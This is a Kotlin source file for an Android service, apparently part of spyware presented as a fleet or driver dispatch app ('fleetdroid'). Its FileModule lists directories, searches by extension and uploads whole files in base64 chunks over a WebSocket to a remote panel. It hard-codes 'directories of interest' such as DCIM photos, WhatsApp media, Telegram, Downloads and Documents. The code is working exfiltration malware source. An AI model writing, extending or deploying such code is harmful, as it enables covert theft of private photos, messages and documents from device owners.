// [context: Android API 26+, ARM64/any — remote file browser + file pull]
// FileModule.kt — lista diretórios, faz pull de arquivos individuais via WS chunked binary
// Paths comuns: /sdcard/DCIM, /sdcard/WhatsApp/Media, /sdcard/Download
package com.fleetdroid.driver.service

import android.content.Context
import android.os.Environment
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object FileModule {

    const val TAG = "FileModule"
    private val DATE_FMT = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    // Diretórios de interesse pré-definidos
    val WATCH_DIRS = listOf(
        Environment.getExternalStorageDirectory().absolutePath,                         // /sdcard
        "${Environment.getExternalStorageDirectory()}/DCIM",                           // fotos
        "${Environment.getExternalStorageDirectory()}/Download",                       // downloads
        "${Environment.getExternalStorageDirectory()}/WhatsApp/Media",                 // WhatsApp
        "${Environment.getExternalStorageDirectory()}/Telegram",                       // Telegram
        "${Environment.getExternalStorageDirectory()}/Pictures",
        "${Environment.getExternalStorageDirectory()}/Documents",
    )

    /**
     * Lista o conteúdo de [path] (não recursivo).
     * Envia um único frame JSON com array de entradas.
     */
    fun listDir(path: String) {
        try {
            val dir = File(path)
            if (!dir.exists() || !dir.isDirectory) {
                DispatchService.instance?.sendWs(
                    """{"type":"error","msg":"dir not found: $path"}"""
                )
                return
            }

            val entries = JSONArray()
            dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name }))?.forEach { f ->
                entries.put(JSONObject().apply {
                    put("name",     f.name)
                    put("path",     f.absolutePath)
                    put("is_dir",   f.isDirectory)
                    put("size",     if (f.isFile) f.length() else 0L)
                    put("modified", DATE_FMT.format(Date(f.lastModified())))
                    put("readable", f.canRead())
                })
            }

            val payload = JSONObject().apply {
                put("type",    "dir_listing")
                put("path",    path)
                put("count",   entries.length())
                put("entries", entries)
            }
            DispatchService.instance?.sendWs(payload.toString())
            Log.d(TAG, "listed $path: ${entries.length()} entries")
        } catch (e: Exception) {
            Log.e(TAG, "listDir error: $path", e)
            DispatchService.instance?.sendWs("""{"type":"error","msg":"listDir failed: ${e.message?.replace("\"","\\\"")}"}""")
        }
    }

    /**
     * Envia um arquivo via WS em chunks base64 de 64KB.
     * O panel pode reassemblar e oferecer download.
     */
    fun pullFile(path: String) {
        try {
            val file = File(path)
            if (!file.exists() || !file.isFile) {
                DispatchService.instance?.sendWs("""{"type":"error","msg":"file not found: $path"}""")
                return
            }
            if (!file.canRead()) {
                DispatchService.instance?.sendWs("""{"type":"error","msg":"cannot read: $path"}""")
                return
            }

            val maxSize = 50 * 1024 * 1024L // 50MB safety cap
            if (file.length() > maxSize) {
                DispatchService.instance?.sendWs(
                    """{"type":"error","msg":"file too large (${file.length()}B), max 50MB"}"""
                )
                return
            }

            val bytes = file.readBytes()
            val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            val chunkSize = 65536
            val total = b64.length
            var offset = 0
            var idx = 0
            val totalChunks = (total + chunkSize - 1) / chunkSize

            Log.d(TAG, "pulling ${file.name}: ${bytes.size}B, $totalChunks chunks")

            while (offset < total) {
                val end = minOf(offset + chunkSize, total)
                val chunk = b64.substring(offset, end)
                val payload = JSONObject().apply {
                    put("type",         "file_chunk")
                    put("path",         path)
                    put("filename",     file.name)
                    put("size_bytes",   bytes.size)
                    put("chunk_idx",    idx)
                    put("total_chunks", totalChunks)
                    put("modified",     DATE_FMT.format(Date(file.lastModified())))
                    put("data",         chunk)
                }
                DispatchService.instance?.sendWs(payload.toString())
                offset += chunkSize
                idx++
            }
            Log.d(TAG, "file pull complete: ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "pullFile error: $path", e)
            DispatchService.instance?.sendWs("""{"type":"error","msg":"pull failed: ${e.message?.replace("\"","\\\"")}"}""")
        }
    }

    /**
     * Busca recursiva por padrão de extensão a partir de [rootPath].
     * Envia lista de matches via WS.
     */
    fun search(rootPath: String, extensions: List<String>, maxResults: Int = 200) {
        try {
            val root = File(rootPath)
            if (!root.exists()) {
                DispatchService.instance?.sendWs("""{"type":"error","msg":"search root not found: $rootPath"}""")
                return
            }
            val exts = extensions.map { it.lowercase().trimStart('.') }
            val results = JSONArray()
            var count = 0

            fun recurse(dir: File) {
                if (count >= maxResults) return
                dir.listFiles()?.forEach { f ->
                    if (count >= maxResults) return
                    if (f.isDirectory) {
                        recurse(f)
                    } else if (exts.isEmpty() || exts.any { f.name.lowercase().endsWith(".$it") }) {
                        results.put(JSONObject().apply {
                            put("path",     f.absolutePath)
                            put("name",     f.name)
                            put("size",     f.length())
                            put("modified", DATE_FMT.format(Date(f.lastModified())))
                        })
                        count++
                    }
                }
            }
            recurse(root)

            val payload = JSONObject().apply {
                put("type",       "file_search_result")
                put("root",       rootPath)
                put("extensions", extensions.joinToString(","))
                put("count",      count)
                put("files",      results)
            }
            DispatchService.instance?.sendWs(payload.toString())
            Log.d(TAG, "search $rootPath [${exts.joinToString(",")}]: $count matches")
        } catch (e: Exception) {
            Log.e(TAG, "search error", e)
        }
    }
}
